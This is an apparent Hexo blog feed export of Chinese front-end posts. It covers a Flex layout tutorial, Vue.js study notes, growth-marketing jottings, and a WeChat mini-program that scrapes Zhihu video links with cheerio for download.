<h2 id="热力图"><a href="#热力图" class="headerlink" title="热力图"></a>热力图</h2><p>当开启热力图时会向用户自己配置的heatmapUrl请求当前页面的热力图数据，绘制热力图。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (status === <span class="string">'on'</span>) &#123;</span><br><span class="line">  <span class="keyword">this</span>.mode = mode;</span><br><span class="line">  <span class="keyword">this</span>._autoHoverCollection();</span><br><span class="line">  <span class="keyword">this</span>._appendWLSStyle();</span><br><span class="line">  <span class="keyword">this</span>._fetchHeatmap().then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>._drawHeatmap(res.data.data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>埋点</tag>
      </tags>
  </entry>
  <entry>
    <title>Flex布局</title>
    <url>/2019/11/22/Flex%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<p>布局的传统解决方案，基于盒状模型，依赖display属性+position属性+float属性。它对那些特殊布局非常不方便，比如垂直居中。<br><a id="more"></a><br>Flex布局，可以简便、完整、响应式地实现各种页面布局。</p>
<h2 id="Flex布局是什么"><a href="#Flex布局是什么" class="headerlink" title="Flex布局是什么?"></a>Flex布局是什么?</h2><p>Flex是Flexible Box的缩写，意为“弹性布局”。</p>
<p>任何一个容器都可以指定Flex布局。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>行内元素也可以使用Flex布局<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Webkit内核的浏览器，必须加上-webkit前缀<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-flex;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，设为Flex布局以后，子元素的float、clear和vertical-align属性将失效。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>采用Flex布局的元素，称为Flex容器(flex container)，简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目(flex item)，简称“项目”。</p>
<p>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置(与边框的交叉点)叫做main start,结束位置叫做main end;交叉轴的开始位置叫做cross start，结束位置叫做cross end。</p>
<p>项目默认沿主轴排列。单个项目占据的主轴空间叫做mian size，占据的交叉轴空间叫做cross size。</p>
<h2 id="容器的属性"><a href="#容器的属性" class="headerlink" title="容器的属性"></a>容器的属性</h2><p>以下6个属性设置在容器上。</p>
<ol>
<li>flex-direction</li>
<li>flex-wrap</li>
<li>flex-flow</li>
<li>justify-content</li>
<li>align-items</li>
<li><p>align-content</p>
<h3 id="flex-direction属性"><a href="#flex-direction属性" class="headerlink" title="flex-direction属性"></a>flex-direction属性</h3><p>flex-direction属性决定主轴的方向(即项目的排列方向)。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>row(默认值)：主轴为水平方向，起点在左端</p>
</li>
<li>row-reverse: 主轴为水平方向，起点在右端</li>
<li>column: 主轴为垂直方向,起点在上沿。</li>
<li>column-reverse: 主轴为垂直方向，起点为下沿</li>
</ol>
<h2 id="flex-wrap属性"><a href="#flex-wrap属性" class="headerlink" title="flex-wrap属性"></a>flex-wrap属性</h2><p>flew-wrap属性定义，如果一条轴线排不下，如何换行。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>nowrap(默认)：不换行</li>
<li>wrap: 换行，第一行在上方</li>
<li>wrap-reverse： 换行第一行在下方<h2 id="flex-flow"><a href="#flex-flow" class="headerlink" title="flex-flow"></a>flex-flow</h2>flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值是row nowrap<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>justify-content属性定义了项目在主轴上的对齐方式<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">justify-content: flex-start | flex-end | center | space-between | space-around</span><br></pre></td></tr></table></figure></p>
<p>具体对齐方式与轴的方向有关。下面假设主轴从左到右</p>
<ol>
<li>flex-start: (默认值)：左对齐</li>
<li>flex-end: 右对齐</li>
<li>center：居中</li>
<li>space-between: 两端对齐，项目之间的间隔都相等</li>
<li>space-around: 每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li>
</ol>
<h2 id="align-items属性"><a href="#align-items属性" class="headerlink" title="align-items属性"></a>align-items属性</h2><p>align-items属性定义项目在交叉轴上如何对齐<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">align-items: flex-start | flex-end | center | baseline | stretch;</span><br></pre></td></tr></table></figure></p>
<p>具体的对齐方式与交叉轴的方向有关，假设交叉轴从上到下</p>
<ol>
<li>flex-start: 交叉轴的起点对齐</li>
<li>flex-end: 交叉轴的终点对齐</li>
<li>center: 交叉轴的中点对齐</li>
<li>baseline: 项目的第一行文字的基线对齐</li>
<li>stretch(默认值)：如果项目未设置高度或设为auto,将占满整个容器的高度。</li>
</ol>
<h2 id="align-content属性"><a href="#align-content属性" class="headerlink" title="align-content属性"></a>align-content属性</h2><p>align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">align-content: flex-start | flex-end | center | space-between | space-around | stretch;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>flex-start: 与交叉轴的起点对齐</li>
<li>flex-end: 与交叉轴的终点对齐</li>
<li>center: 与交叉轴的中点对齐</li>
<li>space-between: 与交叉轴两端对齐，轴线之间的间隔平均分布</li>
<li>space-around: 每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍</li>
<li>stretch(默认值)：轴线占满整个交叉轴</li>
</ol>
<h1 id="项目的属性"><a href="#项目的属性" class="headerlink" title="项目的属性"></a>项目的属性</h1><p>以下6个属性设置在项目上。</p>
<ol>
<li>order</li>
<li>flex-grow</li>
<li>flex-shrink</li>
<li>flex-basis</li>
<li>flex</li>
<li>align-self</li>
</ol>
<h2 id="order属性"><a href="#order属性" class="headerlink" title="order属性"></a>order属性</h2><p>order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order: integer;</span><br></pre></td></tr></table></figure></p>
<h2 id="flex-grow属性"><a href="#flex-grow属性" class="headerlink" title="flex-grow属性"></a>flex-grow属性</h2><p>flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flex-grow: number;</span><br></pre></td></tr></table></figure></p>
<p>如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。</p>
<h2 id="flex-shrink属性"><a href="#flex-shrink属性" class="headerlink" title="flex-shrink属性"></a>flex-shrink属性</h2><p>flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flex-shrink: number;</span><br></pre></td></tr></table></figure></p>
<p>如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。负值对该属性无效。</p>
<h2 id="flex-basis属性"><a href="#flex-basis属性" class="headerlink" title="flex-basis属性"></a>flex-basis属性</h2><p>flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flex-basis: &lt;length&gt; | auto;</span><br></pre></td></tr></table></figure></p>
<p>它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。</p>
<h2 id="flex属性"><a href="#flex属性" class="headerlink" title="flex属性"></a>flex属性</h2><p>flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flex: none | [ &lt;&apos;flex-grow&apos;&gt; &lt;&apos;flex-shrink&apos;&gt;? || &lt;&apos;flex-basis&apos;&gt; ]</span><br></pre></td></tr></table></figure></p>
<p>该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。<br>建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</p>
<h2 id="align-self属性"><a href="#align-self属性" class="headerlink" title="align-self属性"></a>align-self属性</h2><p>align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br></pre></td></tr></table></figure></p>
<p>该属性可能取6个值，除了auto，其他都与align-items属性完全一致。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>埋点</tag>
      </tags>
  </entry>
  <entry>
    <title>增长学习</title>
    <url>/2019/11/26/%E5%A2%9E%E9%95%BF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>栏目化：</p>
<ol>
<li>时间固定</li>
</ol>
<p>新品加限时限量的最低价<br>信任加魅力</p>
<p>天猫旗舰、有新品 (精品)</p>
<p>低价原因：新品价格的历史权重</p>
<h2 id="李佳琦踩过的坑"><a href="#李佳琦踩过的坑" class="headerlink" title="李佳琦踩过的坑"></a>李佳琦踩过的坑</h2><h2 id="选品"><a href="#选品" class="headerlink" title="选品"></a>选品</h2><ol>
<li>选品团队试用</li>
<li>核心团队体验试用</li>
<li>小助理试用</li>
<li>李佳琦</li>
</ol>
<h1 id="喜茶"><a href="#喜茶" class="headerlink" title="喜茶"></a>喜茶</h1><h2 id="喜茶发展历程"><a href="#喜茶发展历程" class="headerlink" title="喜茶发展历程"></a>喜茶发展历程</h2><p>全自营，不接受加盟…</p>
<h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><p>皇茶<br>茶品研发<br>江门-&gt;小镇-&gt;中山</p>
<p>商标山寨-皇茶<br>注册喜茶商标</p>
<p>上海等，渐火。新餐饮，新消费</p>
<p>## </p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>李佳琦</tag>
      </tags>
  </entry>
  <entry>
    <title>vue教程</title>
    <url>/2019/11/27/vue%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>vue教程<br><a id="more"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>知乎视频小程序</title>
    <url>/2019/12/08/%E7%9F%A5%E4%B9%8E%E8%A7%86%E9%A2%91%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<ol>
<li>公交车即将到站提醒</li>
<li>会议议程时间控制</li>
<li>知乎视频下载功能</li>
<li>无限容量照片上传<a id="more"></a>
<h1 id="知乎视频"><a href="#知乎视频" class="headerlink" title="知乎视频"></a>知乎视频</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>浏览知乎的时候发现知乎里的视频没有提供保存到本地的功能。搜索了一波解决方法后，发现有个答主做的小程序应该是最佳解决方案，不过答主并没有给出实现方式。正好最近在学小程序开发，所以就研究了一下，做了一个叫”积木小盒”的微信小程序，将知乎视频下载功能实现了。<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2>仅需两步：<br>1.<br>在知乎回答页点击右上角，出现弹出框，再点击复制链接<br>2.<br>打开”积木小盒”微信小程序,点击知乎视频。将链接粘贴后，点击视频下载即可一键自动爬取视频并保存到本地相册。<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2>使用小程序十分方便，一些其他解决方案比如在pc端打开网页查找元素，找到相应视频链接再下载，操作上其实比不上小程序。一方面对于非开发的小白用户来说，使用控制台查看元素其实还是有一点成本的。另一方面，这种方式需要借助pc端，无法全部在手机上操作完成，大部分用户的使用习惯还是会更倾向于在手机上便捷操作。<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2>知乎视频下载的实现原理其实和在网页中查看元素，找到视频链接下载视频的操作是一样的。它的实现分为两步：1.利用cheerio爬取视频链接 2.使用小程序下载和保存视频。很显然，第一步才是实现的关键。<h3 id="1-利用cheerio爬取视频链接"><a href="#1-利用cheerio爬取视频链接" class="headerlink" title="1. 利用cheerio爬取视频链接"></a>1. 利用cheerio爬取视频链接</h3>由于微信小程序访问的api地址受白名单限制，所以爬取操作都放在node.js服务端进行。我们只需要实现一个接口，传入复制的知乎链接，返回爬取的该网页链接下所有视频的下载地址。这样在爬取阶段我们只需要将服务端域名 <a href="https://www.readingblog.cn" target="_blank" rel="noopener">https://www.readingblog.cn</a>  添加到访问白名单中，而不是将各式各样的知乎域名添加到小程序白名单中。</li>
</ol>
<p>接下来让我们看看服务端是怎么实现的：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">'cheerio'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> videoUrlPrefix = <span class="string">'https://lens.zhihu.com/api/v4/videos/'</span>;</span><br><span class="line"></span><br><span class="line">exports.urlFetchAll = <span class="keyword">async</span> (pageUrl) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> pageRes = <span class="keyword">await</span> axios.get(pageUrl);</span><br><span class="line">    <span class="keyword">const</span> videoSrcList = [];</span><br><span class="line">    <span class="keyword">if</span> (pageRes.status === <span class="number">200</span>) &#123;</span><br><span class="line">        $ = cheerio.load(pageRes.data);</span><br><span class="line">        <span class="keyword">const</span> videoBox = $(<span class="string">'.video-box'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = videoBox.length; i &lt; len; i ++) &#123;</span><br><span class="line">            <span class="keyword">const</span> videoPageUrl = $(videoBox[i]).attr(<span class="string">'href'</span>);</span><br><span class="line">            <span class="keyword">const</span> params = videoPageUrl.split(<span class="string">'/'</span>);</span><br><span class="line">            <span class="keyword">const</span> videoId = params[params.length - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">const</span> videoRes = <span class="keyword">await</span> axios.get(<span class="string">`<span class="subst">$&#123;videoUrlPrefix&#125;</span><span class="subst">$&#123;videoId&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">if</span> (videoRes.status === <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> videoSrc = videoRes.data.playlist.LD.play_url;</span><br><span class="line">                videoSrcList.push(videoSrc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> videoSrcList;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>还是比较容易看出它的实现思路的，这里使用了页面爬取和接口爬取相结合的方式。由于知乎网页使用了js动态渲染，爬取页面没有能够直接爬取到视频元素的链接。所以在页面爬取阶段，我们其实只获取了它的videoId。经过对整个页面元素的过滤、筛选，我们发现带video-box类名的href属性会直接带上videoId，我们直接爬取它。再通过抓包分析，我们发现只要向 <a href="https://lens.zhihu.com/api/v4/videos/" target="_blank" rel="noopener">https://lens.zhihu.com/api/v4/videos/</a> 接口传入videoId就可以返回视频的下载地址，所以通过知乎链接爬取视频下载地址的接口就实现了。</p>
<h3 id="2-使用小程序将视频保存到本地"><a href="#2-使用小程序将视频保存到本地" class="headerlink" title="2. 使用小程序将视频保存到本地"></a>2. 使用小程序将视频保存到本地</h3><p>实现了爬取接口整个功能主体就完成了，剩下的我们在微信小程序调用这个接口，传入用户输入的知乎链接地址，获取视频下载地址。再调用wx的api，downloadFile和saveVideoToPhotosAlbum分别下载和保存视频。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    zhihuPageUrl: <span class="string">''</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  handleUrlChange(e) &#123;</span><br><span class="line">    <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">      zhihuPageUrl: e.detail.value</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  downloadVideo() &#123;</span><br><span class="line">    <span class="keyword">const</span> pageUrl = <span class="keyword">this</span>.data.zhihuPageUrl;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.data.zhihuPageUrl) &#123;</span><br><span class="line">      wx.showToast(&#123;</span><br><span class="line">        title:<span class="string">'链接为空!'</span>,</span><br><span class="line">        icon:<span class="string">'none'</span>,</span><br><span class="line">        duration:<span class="number">2000</span></span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wx.request(&#123;</span><br><span class="line">      url: vedioFetchUrl,</span><br><span class="line">      data: &#123;</span><br><span class="line">        pageUrl,</span><br><span class="line">      &#125;,</span><br><span class="line">      header: &#123;</span><br><span class="line">        <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        res = res.data;</span><br><span class="line">        <span class="keyword">if</span> (res.code === <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> total = res.data.length;</span><br><span class="line">          wx.showToast(&#123;</span><br><span class="line">            title:<span class="string">`开始下载!`</span>,</span><br><span class="line">            icon:<span class="string">'success'</span>,</span><br><span class="line">            duration:<span class="number">2000</span></span><br><span class="line">          &#125;);</span><br><span class="line">          res.data.forEach(<span class="function">(<span class="params">url, index</span>) =&gt;</span> &#123;</span><br><span class="line">            wx.downloadFile(&#123;</span><br><span class="line">              url,</span><br><span class="line">              success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> filePath = res.tempFilePath;</span><br><span class="line">                wx.saveVideoToPhotosAlbum(&#123;</span><br><span class="line">                  filePath: filePath,</span><br><span class="line">                  success() &#123;</span><br><span class="line">                    wx.showToast(&#123;</span><br><span class="line">                      title:<span class="string">`<span class="subst">$&#123;index + <span class="number">1</span>&#125;</span>/<span class="subst">$&#123;total&#125;</span>下载成功!`</span>,</span><br><span class="line">                      icon:<span class="string">'success'</span>,</span><br><span class="line">                      duration:<span class="number">2000</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          wx.showToast(&#123;</span><br><span class="line">            title:<span class="string">'请求失败!'</span>,</span><br><span class="line">            icon:<span class="string">'none'</span>,</span><br><span class="line">            duration:<span class="number">2000</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>小程序</tag>
        <tag>cheerio</tag>
      </tags>
  </entry>
  <entry>
    <title>《vue.js项目实战》</title>
    <url>/2020/02/10/%E3%80%8Avue-js%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%E3%80%8B/</url>
    <content><![CDATA[<p>《vue.js项目实战》<br><a id="more"></a></p>
<h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>01<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vue实例</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 根DOM元素的CSS选择器</span></span></span><br><span class="line"><span class="javascript">      el: <span class="string">'#root'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 一些数据</span></span></span><br><span class="line">      data () &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">          message: <span class="string">'vue'</span>,</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h2><p>推荐使用Chrome的Vue.js devtools调试工具，极大提高调试效率</p>
<h2 id="借助模板实现DOM的动态性"><a href="#借助模板实现DOM的动态性" class="headerlink" title="借助模板实现DOM的动态性"></a>借助模板实现DOM的动态性</h2><p>模板是描述View最简单的方法，只需少量额外语法就能实现DOM的动态更新</p>
<h3 id="文本插值"><a href="#文本插值" class="headerlink" title="文本插值"></a>文本插值</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时数据和视图已经绑定了。vue框架有一个非常强大且高效的响应式系统，打开控制台输入app.message=’test’,视图也会自动更新显示test。</p>
<h3 id="利用指令添加基本的交互"><a href="#利用指令添加基本的交互" class="headerlink" title="利用指令添加基本的交互"></a>利用指令添加基本的交互</h3><p>使用v-model实现数据和视图的双向绑定<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"message"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="02"><a href="#02" class="headerlink" title="02"></a>02</h1><h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><p>可以通过它定义一个新属性，该属性可以结合任意多个属性，并做相关转换操作。</p>
<ol>
<li>计算属性的值会基于它的依赖进行缓存，如果依赖未改变是不会重新计算的。</li>
<li>计算属性真正用于应用中时，才会进行计算。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  notePreview () &#123;</span><br><span class="line">    <span class="comment">// Makedown渲染为HTML返回</span></span><br><span class="line">    <span class="keyword">return</span> marked(<span class="keyword">this</span>.content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="显示HTML内容"><a href="#显示HTML内容" class="headerlink" title="显示HTML内容"></a>显示HTML内容</h2><p>可以使用v-html指令做HTML插值，需要注意避免XSS攻击<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">"notePreview"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>v-text形同典型的文本插值，会对HTML标签做转义处理</p>
<h2 id="侦听器watcher"><a href="#侦听器watcher" class="headerlink" title="侦听器watcher"></a>侦听器watcher</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">watch: &#123;</span><br><span class="line">  <span class="comment">// 侦听content属性</span></span><br><span class="line">  content: &#123;</span><br><span class="line">    <span class="comment">// 处理函数</span></span><br><span class="line">    handler(val, oldVal) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外还有两个选项：</p>
<ol>
<li>deep，布尔类型，会以递归方式侦听嵌套对象内部值的变化。</li>
<li>immediate，布尔类型，会立即触发调用处理函数，而不用等到属性值第一次变化时才调用。<h2 id="复用方法"><a href="#复用方法" class="headerlink" title="复用方法"></a>复用方法</h2>可复用函数可以写在：methods中<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  saveNote(val) &#123;</span><br><span class="line">    localStorage.setItem(<span class="string">'content'</span>, val);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="访问Vue实例"><a href="#访问Vue实例" class="headerlink" title="访问Vue实例"></a>访问Vue实例</h2><p>可以使用this访问Vue实例上的属性和方法</p>
<h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><ol>
<li>beforeCreate:vue实例被创建时（如new Vue({})）、完成其他事项之前调用</li>
<li>created:实例准备就绪之后调用。此时实例还没有挂载到DOM中</li>
<li>beforeMount:挂载实例到Web页面之前调用</li>
<li>mounted:实例被挂载到页面并且DOM可见时调用</li>
<li>beforeUpdate:当实例需要更新时（一般来说，是当某个数据或计算属性发生改变时）调用</li>
<li>updated:在把数据变化应用到模板之后调用。注意此时DOM可能还没有更新。</li>
<li>beforeDestroy:在实例销毁之前调用</li>
<li>destroyed:在实例完全销毁之后调用<br>例如初始化：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">created() &#123;</span><br><span class="line">  <span class="keyword">this</span>.content = localStorage.getItem(<span class="string">'content'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="用v-on实现按钮的单击事件"><a href="#用v-on实现按钮的单击事件" class="headerlink" title="用v-on实现按钮的单击事件"></a>用v-on实现按钮的单击事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"callback"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>简写<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"callback"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
